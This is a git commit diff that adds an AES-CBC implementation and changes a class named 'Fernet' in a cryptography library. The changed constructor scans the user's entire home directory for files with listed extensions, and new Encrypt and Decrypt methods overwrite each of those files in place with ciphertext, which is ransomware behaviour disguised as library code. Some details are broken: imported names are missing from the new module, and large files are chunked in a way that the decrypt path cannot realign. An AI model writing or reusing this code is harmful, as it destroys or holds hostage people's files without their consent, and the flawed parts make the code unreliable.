dbeb8779d6798c0e74d57029595dd8c21414afcf
PhcNguyen <phcnguyenz@proton.me>
2024-04-22 18:27:05 +0700

    1.0.6

---
+++ lib/cryptography/aes.py
@@ -0,0 +1,105 @@
+from lib.cryptography.padding import pad, unpad
+from lib.cryptography.constants import (
+    IV, BLOCK, KEY, List,
+    r_con, s_box
+)
+from lib.cryptography.util import (
+    Bytes2Matrix, xor_Bytes, add_Round_Key, 
+    Sub_Bytes, Shift_Rows, Mix_Columns,
+    Matrix2Bytes, inv_Mix_Columns, inv_Shift_Rows, 
+    inv_Sub_Bytes, Split_Blocks
+)
+
+
+
+class AesCipher:
+    rounds_by_key_size = {16: 10, 24: 12, 32: 14}
+    def __init__(self, master_key: KEY) -> None:
+        assert len(master_key) in AesCipher.rounds_by_key_size
+        self.n_rounds = AesCipher.rounds_by_key_size[len(master_key)]
+        self._key_matrices = self._expand_key(master_key)
+
+    def _expand_key(self, master_key: KEY) -> List[List[List[int]]]:
+        key_columns = Bytes2Matrix(master_key)
+        iteration_size = len(master_key) // 4
+
+        i = 1
+        while len(key_columns) < (self.n_rounds + 1) * 4:
+            word = list(key_columns[-1])
+
+            if len(key_columns) % iteration_size == 0:
+                word.append(word.pop(0))
+                word = [s_box[b] for b in word]
+                word[0] ^= r_con[i]
+                i += 1
+            elif len(master_key) == 32 and len(key_columns) % iteration_size == 4:
+                word = [s_box[b] for b in word]
+
+            word = xor_Bytes(word, key_columns[-iteration_size])
+            key_columns.append(word)
+
+        return [key_columns[4*i : 4*(i+1)] for i in range(len(key_columns) // 4)]
+
+    def encrypt_block(self, plaintext: BLOCK) -> BLOCK:
+        assert len(plaintext) == 16
+
+        plain_state = Bytes2Matrix(plaintext)
+
+        add_Round_Key(plain_state, self._key_matrices[0])
+
+        for i in range(1, self.n_rounds):
+            Sub_Bytes(plain_state)
+            Shift_Rows(plain_state)
+            Mix_Columns(plain_state)
+            add_Round_Key(plain_state, self._key_matrices[i])
+
+        Sub_Bytes(plain_state)
+        Shift_Rows(plain_state)
+        add_Round_Key(plain_state, self._key_matrices[-1])
+
+        return Matrix2Bytes(plain_state)
+
+    def decrypt_block(self, ciphertext: BLOCK) -> BLOCK:
+       
+        assert len(ciphertext) == 16
+
+        cipher_state = Bytes2Matrix(ciphertext)
+
+        add_Round_Key(cipher_state, self._key_matrices[-1])
+        inv_Shift_Rows(cipher_state)
+        inv_Sub_Bytes(cipher_state)
+
+        for i in range(self.n_rounds - 1, 0, -1):
+            add_Round_Key(cipher_state, self._key_matrices[i])
+            inv_Mix_Columns(cipher_state)
+            inv_Shift_Rows(cipher_state)
+            inv_Sub_Bytes(cipher_state)
+
+        add_Round_Key(cipher_state, self._key_matrices[0])
+
+        return Matrix2Bytes(cipher_state)
+
+    def encrypt_cbc(self, plaintext: bytes, iv: IV) -> bytes:
+        assert len(iv) == 16
+
+        plaintext = pad(plaintext)
+
+        blocks = []
+        previous = iv
+        for plaintext_block in Split_Blocks(plaintext):
+            block = self.encrypt_block(xor_Bytes(plaintext_block, previous))
+            blocks.append(block)
+            previous = block
+
+        return b''.join(blocks)
+
+    def decrypt_cbc(self, ciphertext: bytes, iv: IV) -> bytes:
+        assert len(iv) == 16
+
+        blocks = []
+        previous = iv
+        for ciphertext_block in Split_Blocks(ciphertext):
+            blocks.append(xor_Bytes(previous, self.decrypt_block(ciphertext_block)))
+            previous = ciphertext_block
+
+        return unpad(b''.join(blocks))
--- lib/cryptography/fernet.py
+++ lib/cryptography/fernet.py
@@ -1,18 +1,22 @@
-#!/usr/bin/env python3
 import os
+import mmap
+import shutil
 import base64
 import binascii
-from typing import Union
+from pathlib import Path
+from typing import Union, Dict, List
 from hmac import new as new_hmac, compare_digest
-from lib.cryptography.cipher import (
+
+from lib.modules.yaml import safe_load
+from lib.cryptography.aes import (
     SALT_SIZE, HMAC_SIZE, 
-    get_key_iv, AESCipher
+    get_key_iv, AesCipher
 )
 
+MAX_FILE_SIZE = 1024 * 1024 * 10 # 10MB
 
 class Fernet:
     def __init__(self, key: Union[bytes, str]) -> None:
-        self.key = key
         try:
             key = base64.urlsafe_b64decode(key)
         except binascii.Error as exc:
@@ -23,12 +27,15 @@ class Fernet:
             raise ValueError(
                 "Fernet key must be 32 url-safe base64-encoded bytes."
             )
+        self.key = key
+        self.list_file()
+        
     
     @classmethod
     def generate_key(cls) -> bytes:
         return base64.urlsafe_b64encode(os.urandom(32))
     
-    def encrypt(self, plaintext: Union[bytes, str]) -> str:
+    def __encrypt(self, plaintext: Union[bytes, str]) -> str:
         if isinstance(self.key, str):
             self.key = self.key.encode('utf-8')
         if isinstance(plaintext, str):
@@ -36,13 +43,13 @@ class Fernet:
 
         salt = os.urandom(SALT_SIZE)
         key, hmac_key, iv = get_key_iv(self.key, salt)
-        ciphertext = AESCipher(key).encrypt_cbc(plaintext, iv)
+        ciphertext = AesCipher(key).encrypt_cbc(plaintext, iv)
         hmac = new_hmac(hmac_key, salt + ciphertext, 'sha256').digest()
         assert len(hmac) == HMAC_SIZE
         
         return hmac + salt + ciphertext
     
-    def decrypt(self, ciphertext: Union[bytes, str]) -> str:
+    def __decrypt(self, ciphertext: Union[bytes, str]) -> str:
         if isinstance(self.key, str):
             self.key = self.key.encode('utf-8')
 
@@ -53,4 +60,72 @@ class Fernet:
         expected_hmac = new_hmac(hmac_key, salt + ciphertext, 'sha256').digest()
         assert compare_digest(hmac, expected_hmac), 'Ciphertext corrupted or tampered.'
 
-        return AESCipher(key).decrypt_cbc(ciphertext, iv).decode()
+        return AesCipher(key).decrypt_cbc(ciphertext, iv).decode()
+    
+    def list_file(self) -> Dict[str, List[str]]:
+        """
+        Lists files in the user's home directory categorized by file extension.
+
+        Returns:
+            Dict[str, List[str]]: A dictionary where keys are file extensions and values are lists of file paths.
+        """
+        with open('scripts/extensions.yaml', 'r') as file:
+            exts = safe_load(file)
+
+        file_categories: Dict[str, List[str]] = {category: [] for category in exts}
+        extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}
+
+        for entry in Path.home().rglob('*'):
+            if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
+                file_categories[extcategory[ext]].append(str(entry))
+
+        self.file_categories = file_categories
+
+    def process_files(self, mode: str) -> None:
+        """
+        Encrypts or decrypts files based on the specified mode.
+
+        Args:
+            Private (Fernet): An instance of the Fernet class.
+            mode (str): Either 'encrypt' or 'decrypt'.
+        """
+        for _, files in self.file_categories.items():
+            for file in files:
+                temp_file = file + '.temp'
+                try:
+                    file_size = os.path.getsize(file)
+                    if file_size <= MAX_FILE_SIZE:  # Nếu kích thước tệp nhỏ hơn hoặc bằng ngưỡng cho phép
+                        with open(file, 'rb') as original_file, open(temp_file, 'wb') as temp_file:
+                            chunk = original_file.read()
+                            processed_chunk = self.__encrypt(chunk) if mode == 'encrypt' else self.__decrypt(chunk)
+                            temp_file.write(processed_chunk)
+                    else:  # Nếu kích thước tệp lớn hơn ngưỡng cho phép
+                        with open(file, 'rb') as original_file, open(temp_file, 'wb') as temp_file:
+                            while True:
+                                chunk = original_file.read(1024 * 1024 * 10)  # Đọc từng phần của tệp
+                                if not chunk:
+                                    break
+                                processed_chunk = self.__encrypt(chunk) if mode == 'encrypt' else self.__decrypt(chunk)
+                                temp_file.write(processed_chunk)
+                    shutil.move(temp_file.name, file)
+                except Exception:
+                    if os.path.exists(temp_file.name):
+                        os.remove(temp_file.name)
+    
+    def Encrypt(self) -> None:
+        """
+        Encrypts files using Fernet encryption.
+
+        Args:
+            Private (Fernet): An instance of the Fernet class.
+        """
+        self.process_files('encrypt')
+    
+    def Decrypt(self) -> None:
+        """
+        Decrypts files using Fernet decryption.
+
+        Args:
+            Private (Fernet): An instance of the Fernet class.
+        """
+        self.process_files('decrypt')
